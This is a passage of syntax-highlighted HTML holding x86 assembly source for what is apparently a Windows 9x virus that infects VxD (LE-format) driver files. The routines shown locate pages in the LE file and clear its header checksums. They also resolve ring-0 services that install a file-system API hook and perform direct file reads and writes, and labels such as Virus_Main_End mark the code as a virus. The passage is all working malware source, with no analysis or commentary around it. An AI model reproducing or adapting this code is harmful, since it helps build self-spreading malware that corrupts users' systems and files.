</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Header</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">No_EIP_Patch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Return_IP</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_pagemap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;Calculate the file offset for a page</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ECX=Page number</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,ECX,EDX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    EAX=Offset (within file) of page</span><span class="sc0">
</span><span class="sc1">;    ECX,EDX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Get_Page_Offset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objmap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Recalc</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OPH_flags\
</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER</span><span class="sc4">],</span><span class="sc5">IMAGE_PAGE_VALID</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Get_Page_Offset_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OPH_highpage</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_datapage</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Get_Page_Offset_Fail</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Clear checksums</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,ECX=?</span><span class="sc0">
</span><span class="sc1">;  Checksums cleared</span><span class="sc0">
</span><span class="sc1">;  Set the Write_LE_Header flag if any checksum cleared</span><span class="sc0">
</span><span class="sc5">Clear_Checksums</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.LE_fixupsum</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Wipe_Checksum</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.LE_ldrsum</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Wipe_Checksum</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.LE_pagesum</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;call Wipe_Checksum</span><span class="sc0">
</span><span class="sc1">;lea eax,[esi.LE_nressum]</span><span class="sc0">
</span><span class="sc1">;call Wipe_Checksum</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">

</span><span class="sc5">Wipe_Checksum</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Already_Clear</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Header</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Already_Clear</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Get "object table" address (first object)</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=Pointer to "object table"</span><span class="sc0">
</span><span class="sc5">Get_Object_Table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objtab</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Recalc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Fix dynamic links</span><span class="sc0">
</span><span class="sc5">Fix_Dynamic_Links</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">Dyna_Link_Int</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link1</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@Hook_Device_Service</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link2</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@_HeapAllocate</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link3</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@_HeapFree</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link4</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link5</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@UniToBCSPath</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Dynamic_Link6</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">@@IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">My_HeapAllocate</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Flags</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Size (in bytes)</span><span class="sc0">
</span><span class="sc5">Dynamic_Link2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapAllocate</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">My_HeapFree</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Flags</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Address of block</span><span class="sc0">
</span><span class="sc5">Dynamic_Link3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;File input/output</span><span class="sc0">
</span><span class="sc5">FileIO_Write</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Simulate_FileIO</span><span class="sc0">
</span><span class="sc5">FileIO_Read</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
</span><span class="sc5">Simulate_FileIO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Handle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Original_FileIO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Dynamic_Link6</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Virus_Main_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Loader_Buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">Loader_Size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_Physical_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">File_Buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">IMAGE_VXD_HEADER</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DDB_Buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Write_LE_Header</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Write_LE_Info</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Virus_Virtual_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">VxD_CODE_ENDS</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
